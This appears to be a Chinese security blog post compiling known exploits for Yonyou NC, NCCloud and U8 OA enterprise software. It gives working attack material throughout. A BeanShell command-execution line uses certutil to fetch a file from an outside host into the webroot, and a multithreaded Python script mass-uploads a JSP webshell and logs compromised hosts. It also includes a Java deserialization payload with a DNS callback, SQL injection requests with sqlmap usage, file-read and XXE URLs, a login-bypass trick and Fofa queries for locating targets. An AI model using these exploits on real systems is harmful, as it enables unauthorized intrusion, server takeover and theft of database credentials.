# 用友NC 漏洞整理

## 0x00 前言

整理下用友NC历史漏洞



## 0x01 漏洞检测工具

[用友NC漏洞检测](https://github.com/kezibei/yongyou_nc_poc)

[用友NC-OA漏洞合集](https://github.com/asdasdqkq1/yonyou-nc-exp)

[ncDecode---用友nc数据库密码解密](https://github.com/jas502n/ncDecode)



## 0x02 配置文件

### 2.1 WEB.xml

```
/webapps/nc_web/WEB-INF/web.xml
```

```xml
	<servlet-mapping>
	  <servlet-name>NCInvokerServlet</servlet-name>
	  <url-pattern>/service/*</url-pattern>
	</servlet-mapping>
	
	<servlet-mapping>
	  <servlet-name>NCInvokerServlet</servlet-name>
	  <url-pattern>/servlet/*</url-pattern>
	</servlet-mapping>
```



### 2.2 prop.xml(数据库配置)

```
/ierp/bin/prop.xml
```

```xml
<dataSource>
<dataSourceName>nc</dataSourceName>
<oidMark>C2</oidMark>
<databaseUrl>jdbc:sqlserver://127.0.0.1:1433;database=nc;sendStringParametersAsUnicode=false</databaseUrl>
<user>nc</user>
<password>jlehfdffcfmohiag</password>
<driverClassName>com.microsoft.sqlserver.jdbc.SQLServerDriver</driverClassName>
<databaseType>SQLSERVER</databaseType>
<maxCon>50</maxCon>
<minCon>10</minCon>
<dataSourceClassName>nc.bs.mw.ejb.xares.IerpDataSource</dataSourceClassName>
<xaDataSourceClassName>nc.bs.mw.ejb.xares.IerpXADataSource</xaDataSourceClassName>
<conIncrement>0</conIncrement>
<conInUse>0</conInUse>
<conIdle>0</conIdle>
</dataSource>
```



## 0x03 漏洞整理

### 3.1 任意文件读取

`filename`参数可以读取下列所有文件，在某些情况下可以读取利用目录穿越可读取/etc/passwd等文件

```
http://x.x.x.x/NCFindWeb?service=IPreAlertConfigService&filename=/
```

![image-20220420110517903](https://raw.githubusercontent.com/j2ekim/blog-image/main/image//image-20220420110517903.png)

### 3.2 `bsh.servlet.BshServlet` 远程命令执行漏洞

用友 `NC bsh.servlet.BshServlet` 存在远程命令执行漏洞，通过 `BeanShell` 执行远程命令获取服务器权限。

exp：

```
exec("cmd.exe /c  certutil -urlcache -split -f http://vps/ccc.txt  webapps/nc_web/aa.jsp");
```

poc:

```
http://x.x.x.x/service/~aim/bsh.servlet.BshServlet
http://x.x.x.x/service/~alm/bsh.servlet.BshServlet
http://x.x.x.x/service/~ampub/bsh.servlet.BshServlet
http://x.x.x.x/service/~arap/bsh.servlet.BshServlet
http://x.x.x.x/service/~aum/bsh.servlet.BshServlet
http://x.x.x.x/service/~cc/bsh.servlet.BshServlet
http://x.x.x.x/service/~cdm/bsh.servlet.BshServlet
http://x.x.x.x/service/~cmp/bsh.servlet.BshServlet
http://x.x.x.x/service/~ct/bsh.servlet.BshServlet
http://x.x.x.x/service/~dm/bsh.servlet.BshServlet
http://x.x.x.x/service/~erm/bsh.servlet.BshServlet
http://x.x.x.x/service/~fa/bsh.servlet.BshServlet
http://x.x.x.x/service/~fac/bsh.servlet.BshServlet
http://x.x.x.x/service/~fbm/bsh.servlet.BshServlet
http://x.x.x.x/service/~ff/bsh.servlet.BshServlet
http://x.x.x.x/service/~fip/bsh.servlet.BshServlet
http://x.x.x.x/service/~fipub/bsh.servlet.BshServlet
http://x.x.x.x/service/~fp/bsh.servlet.BshServlet
http://x.x.x.x/service/~fts/bsh.servlet.BshServlet
http://x.x.x.x/service/~fvm/bsh.servlet.BshServlet
http://x.x.x.x/service/~gl/bsh.servlet.BshServlet
http://x.x.x.x/service/~hrhi/bsh.servlet.BshServlet
http://x.x.x.x/service/~hrjf/bsh.servlet.BshServlet
http://x.x.x.x/service/~hrpd/bsh.servlet.BshServlet
http://x.x.x.x/service/~hrpub/bsh.servlet.BshServlet
http://x.x.x.x/service/~hrtrn/bsh.servlet.BshServlet
http://x.x.x.x/service/~hrwa/bsh.servlet.BshServlet
http://x.x.x.x/service/~ia/bsh.servlet.BshServlet
http://x.x.x.x/service/~ic/bsh.servlet.BshServlet
http://x.x.x.x/service/~iufo/bsh.servlet.BshServlet
http://x.x.x.x/service/~modules/bsh.servlet.BshServlet
http://x.x.x.x/service/~mpp/bsh.servlet.BshServlet
http://x.x.x.x/service/~obm/bsh.servlet.BshServlet
http://x.x.x.x/service/~pu/bsh.servlet.BshServlet
http://x.x.x.x/service/~qc/bsh.servlet.BshServlet
http://x.x.x.x/service/~sc/bsh.servlet.BshServlet
http://x.x.x.x/service/~scmpub/bsh.servlet.BshServlet
http://x.x.x.x/service/~so/bsh.servlet.BshServlet
http://x.x.x.x/service/~so2/bsh.servlet.BshServlet
http://x.x.x.x/service/~so3/bsh.servlet.BshServlet
http://x.x.x.x/service/~so4/bsh.servlet.BshServlet
http://x.x.x.x/service/~so5/bsh.servlet.BshServlet
http://x.x.x.x/service/~so6/bsh.servlet.BshServlet
http://x.x.x.x/service/~tam/bsh.servlet.BshServlet
http://x.x.x.x/service/~tbb/bsh.servlet.BshServlet
http://x.x.x.x/service/~to/bsh.servlet.BshServlet
http://x.x.x.x/service/~uap/bsh.servlet.BshServlet
http://x.x.x.x/service/~uapbd/bsh.servlet.BshServlet
http://x.x.x.x/service/~uapde/bsh.servlet.BshServlet
http://x.x.x.x/service/~uapeai/bsh.servlet.BshServlet
http://x.x.x.x/service/~uapother/bsh.servlet.BshServlet
http://x.x.x.x/service/~uapqe/bsh.servlet.BshServlet
http://x.x.x.x/service/~uapweb/bsh.servlet.BshServlet
http://x.x.x.x/service/~uapws/bsh.servlet.BshServlet
http://x.x.x.x/service/~vrm/bsh.servlet.BshServlet
http://x.x.x.x/service/~yer/bsh.servlet.BshServlet
```

![image-20220420113613160](https://raw.githubusercontent.com/j2ekim/blog-image/main/image/image-20220420113613160.png)

### 3.3 用友 `NCCloud FS` 文件管理 `SQL` 注入

用友 `NCCloud FS` 文件管理登录页面对用户名参数没有过滤，存在 `SQL` 注入。

Fofa:

```
"/platform/yonyou-yyy.js"
```

`nccloud` 登录界面：

![image-20220420125901020](https://raw.githubusercontent.com/j2ekim/blog-image/main/image/image-20220420125901020.png)

文件服务器管理登录页面：

```
http://x.x.x.x/fs/
```

![image-20220420130019063](https://raw.githubusercontent.com/j2ekim/blog-image/main/image/image-20220420130019063.png)

`username`参数存在注入，抓取登录数据包：

```http
GET /fs/console?username=1&password=00PGRLxSTe3VroI21qJNymCrZfPX1UQ4ij0gIWn2Gc4%3D HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://x.x.x.x/fs/
Cookie: JSESSIONID=FFAE8EF48BD3BEF7E94B5449B8F9BA90.server
Upgrade-Insecure-Requests: 1	
```

`sqlmap` 跑注入：

```shell
sqlmap -r text.txt -p username 
```

![image-20220420130305834](https://raw.githubusercontent.com/j2ekim/blog-image/main/image/image-20220420130305834.png)



### 3.4 用友 `NC 6.5` 未授权文件上传漏洞

用友 `NC6.5` 版本存在未授权文件上传漏洞，攻击者可以未授权上传任意文件，进而获取服务端控制权限。

Fofa:

```
"/platform/yonyou-yyy.js"
```

POC:

```python
import requests
import threadpool
import urllib3
import sys
import argparse

urllib3.disable_warnings()
proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
header = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://google.com",
}

def multithreading(funcname, filename="url.txt", pools=5):
    works = []
    with open(filename, "r") as f:
        for i in f:
            func_params = [i.rstrip("\n")]
            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()

def wirte_targets(vurl, filename):
    with open(filename, "a+") as f:
        f.write(vurl + "\n")
        return vurl
    
def exp(u):
    uploadHeader = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "Content-Type": "multipart/form-data;",
        "Referer": "https://google.com"
    }
    uploadData = "\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x02\x74\x00\x09\x46\x49\x4c\x45\x5f\x4e\x41\x4d\x45\x74\x00\x09\x74\x30\x30\x6c\x73\x2e\x6a\x73\x70\x74\x00\x10\x54\x41\x52\x47\x45\x54\x5f\x46\x49\x4c\x45\x5f\x50\x41\x54\x48\x74\x00\x10\x2e\x2f\x77\x65\x62\x61\x70\x70\x73\x2f\x6e\x63\x5f\x77\x65\x62\x78"
    shellFlag="t0test0ls"
    uploadData+=shellFlag
    try:
        req1 = requests.post(u + "/servlet/FileReceiveServlet", headers=uploadHeader, verify=False, data=uploadData, timeout=25)
        if req1.status_code == 200 :
            req3=requests.get(u+"/t00ls.jsp",headers=header, verify=False, timeout=25)

            if  req3.text.index(shellFlag)>=0:
                printFlag = "[Getshell]" + u+"/t00ls.jsp"  + "\n"
                print (printFlag)
                wirte_targets(printFlag, "vuln.txt")
    except :
        pass
    #print(printFlag, end="")


if __name__ == "__main__":
    if (len(sys.argv)) < 2:
        print('useage : python' +str(sys.argv[0]) + ' -h')
    else:
        parser =argparse.ArgumentParser()
        parser.description ='YONYOU UC 6.5 FILE UPLOAD!'
        parser.add_argument('-u',help="url -> example [url]http://127.0.0.1[/url]",type=str,dest='check_url')
        parser.add_argument('-r',help="url list to file",type=str,dest='check_file')
        args =parser.parse_args()
        if args.check_url:
            exp(args.check_url)
        
        if(args.check_file):
            multithreading(exp, args.check_file, 8)
```

当然也可以利用工具

[用友NC-OA漏洞合集](https://github.com/asdasdqkq1/yonyou-nc-exp)

### 3.5 用友 `NC XbrlPersistenceServlet` 反序列化

已知用友 `NC6.5` 版本存在反序列化漏洞，攻击者可以执行系统命令，获取服务端权限。

```
/service/~xbrl/XbrlPersistenceServlet
```

POC:

```python
import requests
import threadpool
import urllib3
import sys
import base64

ip = "x.x.x.x"
dnslog = "*****" #dnslog把字符串转16进制替换该段，测试用的ceye.io可以回显
data = "\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x01\x73\x72\x00\x0c\x6a\x61\x76\x61\x2e\x6e\x65\x74\x2e\x55\x52\x4c\x96\x25\x37\x36\x1a\xfc\xe4\x72\x03\x00\x07\x49\x00\x08\x68\x61\x73\x68\x43\x6f\x64\x65\x49\x00\x04\x70\x6f\x72\x74\x4c\x00\x09\x61\x75\x74\x68\x6f\x72\x69\x74\x79\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x04\x66\x69\x6c\x65\x71\x00\x7e\x00\x03\x4c\x00\x04\x68\x6f\x73\x74\x71\x00\x7e\x00\x03\x4c\x00\x08\x70\x72\x6f\x74\x6f\x63\x6f\x6c\x71\x00\x7e\x00\x03\x4c\x00\x03\x72\x65\x66\x71\x00\x7e\x00\x03\x78\x70\xff\xff\xff\xff\x00\x00\x00\x50\x74\x00\x11"+dnslog+"\x3a\x38\x30\x74\x00\x00\x74\x00\x0e"+dnslog+"\x74\x00\x04\x68\x74\x74\x70\x70\x78\x74\x00\x18\x68\x74\x74\x70\x3a\x2f\x2f"+dnslog+"\x3a\x38\x30\x78"

uploadHeader={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"}
req = requests.post("http://+"ip"+/service/~xbrl/XbrlPersistenceServlet", headers=uploadHeader, verify=False, data=data, timeout=25)
print (req.text)
```

### 3.6 用友 `U8 OA` `SQL`注入漏洞

用友 `U8 OA test.jsp` 文件存在 `SQL` 注入漏洞

Fofa:

```
"/yyoa/seeyonoa/common/"
```

POC:

```
/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))
```

![image-20220420133908432](https://raw.githubusercontent.com/j2ekim/blog-image/main/image/image-20220420133908432.png)

`sqlmap`跑一下

![image-20220420134720251](https://raw.githubusercontent.com/j2ekim/blog-image/main/image/image-20220420134720251.png)



### 3.7 xxe漏洞

接口处的XXE漏洞

POC:

```
/uapws/service/nc.uap.oba.update.IUpdateService?wsdl
```

![image-20220420135051396](https://raw.githubusercontent.com/j2ekim/blog-image/main/image/image-20220420135051396.png)



### 3.8 接口信息泄露

在其中有个接口可以获取数据库账户密码，不过是老版本了

```
/uapws/service
```

![image-20220420135719084](https://raw.githubusercontent.com/j2ekim/blog-image/main/image/image-20220420135719084.png)

### 3.9 控制台密码绕过

```
/uapws/index.jsp
```

账户密码随便填，抓包将返回包0改为1,即可任意用户登录

![image-20220420140418744](https://raw.githubusercontent.com/j2ekim/blog-image/main/image/image-20220420140418744.png)

![image-20220420140203418](https://raw.githubusercontent.com/j2ekim/blog-image/main/image/image-20220420140203418.png)

## 0x04 参考

[整理一下用友NC已知的漏洞](https://mp.weixin.qq.com/s/1GZKGKCYt5Dg6NTA_6ylvQ)

[『渗透测试』用友各种漏洞整理](https://mp.weixin.qq.com/s/tKqGdMlzAhKuSLtUv6E9-g)

[用友NC历史漏洞(含POC)](https://mp.weixin.qq.com/s/xVKuJb3DbKH0em0HoMZ4ZQ)

